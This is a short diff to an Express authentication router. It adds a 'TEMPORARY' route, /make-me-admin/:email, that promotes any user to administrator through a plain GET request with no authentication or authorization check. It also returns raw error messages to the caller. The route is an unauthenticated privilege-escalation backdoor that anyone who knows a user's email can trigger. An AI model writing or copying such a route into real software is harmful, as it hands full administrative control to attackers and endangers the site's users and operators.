@@ -100,6 +100,21 @@ router.post('/verify-otp', async (req, res) => {
   }
 });
 
+// TEMPORARY: Promote a user to admin (Delete this after use!)
+router.get('/make-me-admin/:email', async (req, res) => {
+  try {
+    const user = await User.findOneAndUpdate(
+      { email: req.params.email },
+      { role: 'admin' },
+      { new: true }
+    );
+    if (!user) return res.status(404).send('User not found');
+    res.send(`SUCCESS: ${user.email} is now an ADMIN!`);
+  } catch (err) {
+    res.status(500).send(err.message);
+  }
+});
+
 router.get('/me', require('../middleware/auth').auth, async (req, res) => {
     try {
         const user = await User.findById(req.user.userId).select('-password');
